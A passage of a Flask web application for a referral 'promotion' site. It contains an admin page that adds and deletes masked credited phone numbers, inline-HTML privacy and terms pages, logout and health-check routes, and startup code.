                INSERT INTO credited_numbers
                (
                    masked_phone,
                    created_at
                )
                VALUES (?, ?)
            """, (
                masked,
                datetime.utcnow().isoformat()
            ))

        conn.commit()
        conn.close()

        flash(
            "Credited numbers added successfully."
        )

        return redirect(
            url_for(
                "admin_credited_numbers"
            )
        )

    conn = get_db()

    credited = conn.execute("""
        SELECT
            id,
            masked_phone,
            created_at
        FROM credited_numbers
        ORDER BY id DESC
    """).fetchall()

    conn.close()

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Credited Numbers</title>

    <style>

        body {
            margin: 0;
            background: #f0f4f8;
            font-family: Arial, sans-serif;
        }

        .container {
            max-width: 800px;
            margin: 30px auto;
            padding: 20px;
        }

        .box {
            background: white;
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 20px;
        }

        textarea {
            width: 100%;
            min-height: 180px;
            box-sizing: border-box;
            padding: 13px;
        }

        button {
            width: 100%;
            padding: 14px;
            margin-top: 12px;
            border: 0;
            border-radius: 8px;
            background: #0077b6;
            color: white;
            font-weight: bold;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th,
        td {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            text-align: left;
        }

        .delete {
            color: #c1121f;
        }

        a {
            color: #0077b6;
            text-decoration: none;
        }

    </style>

</head>

<body>

<div class="container">

    <div class="box">

        <h1>Credited Numbers</h1>

        <p>
            Add only numbers that you have actually credited.
            The public website will only display the masked
            version.
        </p>

        <p>
            Example:
            08031234567 becomes 0803****567.
        </p>

        {% with messages = get_flashed_messages() %}

            {% for message in messages %}

                <p>{{ message }}</p>

            {% endfor %}

        {% endwith %}

        <form method="POST">

            <textarea
                name="numbers"
                placeholder="Enter one number per line"
                required
            ></textarea>

            <button type="submit">
                ADD CREDITED NUMBERS
            </button>

        </form>

    </div>


    <div class="box">

        <h2>Current Public Notifications</h2>

        <table>

            <tr>

                <th>Number</th>
                <th>Date</th>
                <th>Action</th>

            </tr>

            {% for item in credited %}

            <tr>

                <td>
                    {{ item['masked_phone'] }}
                </td>

                <td>
                    {{ item['created_at'] }}
                </td>

                <td>

                    <a
                        class="delete"
                        href="{{ url_for(
                            'delete_credited_number',
                            number_id=item['id']
                        ) }}"
                        onclick="return confirm(
                            'Delete this notification?'
                        )"
                    >
                        Delete
                    </a>

                </td>

            </tr>

            {% endfor %}

        </table>

    </div>


    <a href="{{ url_for('admin_dashboard') }}">
        Back to Dashboard
    </a>

</div>

</body>
</html>
""")


# ============================================================
# DELETE CREDITED NUMBER
# ============================================================

@app.route(
    "/secret-admin/credited-numbers/delete/<int:number_id>"
)
@admin_required
def delete_credited_number(number_id):

    conn = get_db()

    conn.execute(
        """
        DELETE FROM credited_numbers
        WHERE id = ?
        """,
        (number_id,)
    )

    conn.commit()
    conn.close()

    return redirect(
        url_for(
            "admin_credited_numbers"
        )
    )


# ============================================================
# PRIVACY POLICY
# ============================================================

@app.route("/privacy")
def privacy():

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Privacy Policy</title>

    <style>

        body {
            margin: 0;
            background: #f0f4f8;
            font-family: Arial, sans-serif;
        }

        .container {
            max-width: 700px;
            margin: auto;
            background: white;
            min-height: 100vh;
            padding: 25px;
        }

        h1 {
            text-align: center;
        }

        p {
            line-height: 1.7;
        }

        a {
            color: #0077b6;
        }

    </style>

</head>

<body>

<div class="container">

    <h1>Privacy Policy</h1>

    <p>
        We respect your privacy and aim to handle information
        responsibly.
    </p>

    <p>
        Information submitted through this promotion may be
        used to operate the promotion, maintain participation
        records and manage referral activity.
    </p>

    <p>
        Phone numbers entered for participation are not
        publicly displayed in full.
    </p>

    <p>
        When a credited number is displayed in a public
        notification, only a masked version is shown.
    </p>

    <p>
        Please do not submit information that you are not
        authorized to provide.
    </p>

    <a href="{{ url_for('home') }}">
        Back to Promotion
    </a>

</div>

</body>
</html>
""")


# ============================================================
# TERMS
# ============================================================

@app.route("/terms")
def terms():

    return render_template_string("""
<!DOCTYPE html>
<html>
<head>

    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Terms</title>

    <style>

        body {
            margin: 0;
            background: #f0f4f8;
            font-family: Arial, sans-serif;
        }

        .container {
            max-width: 700px;
            margin: auto;
            background: white;
            min-height: 100vh;
            padding: 25px;
        }

        h1 {
            text-align: center;
        }

        p {
            line-height: 1.7;
        }

        a {
            color: #0077b6;
        }

    </style>

</head>

<body>

<div class="container">

    <h1>Terms and Conditions</h1>

    <p>
        By participating in this promotion, you agree to
        provide accurate information and use the promotion
        only for its intended purpose.
    </p>

    <p>
        Referral activity is tracked according to the
        promotion's share-click system.
    </p>

    <p>
        Reaching the displayed referral target means that
        the participant has completed the required share
        count. Any actual fulfilment of an offer should be
        handled by the promotion administrator.
    </p>

    <p>
        The promotion administrator may update or end the
        promotion when necessary.
    </p>

    <a href="{{ url_for('home') }}">
        Back to Promotion
    </a>

</div>

</body>
</html>
""")


# ============================================================
# ADMIN LOGOUT
# ============================================================

@app.route("/secret-admin/logout")
def admin_logout():

    session.clear()

    return redirect(
        url_for("admin_login")
    )


# ============================================================
# HEALTH CHECK
# ============================================================

@app.route("/health")
def health():

    return jsonify({
        "status": "ok"
    })


# ============================================================
# START APP
# ============================================================

setup_database()


if __name__ == "__main__":

    port = int(
        os.environ.get(
            "PORT",
            "5000"
        )
    )

    debug_mode = (
        os.environ.get(
            "FLASK_DEBUG",
            "0"
        ) == "1"
    )

    app.run(
        host="0.0.0.0",
        port=port,
        debug=debug_mode
    )

 
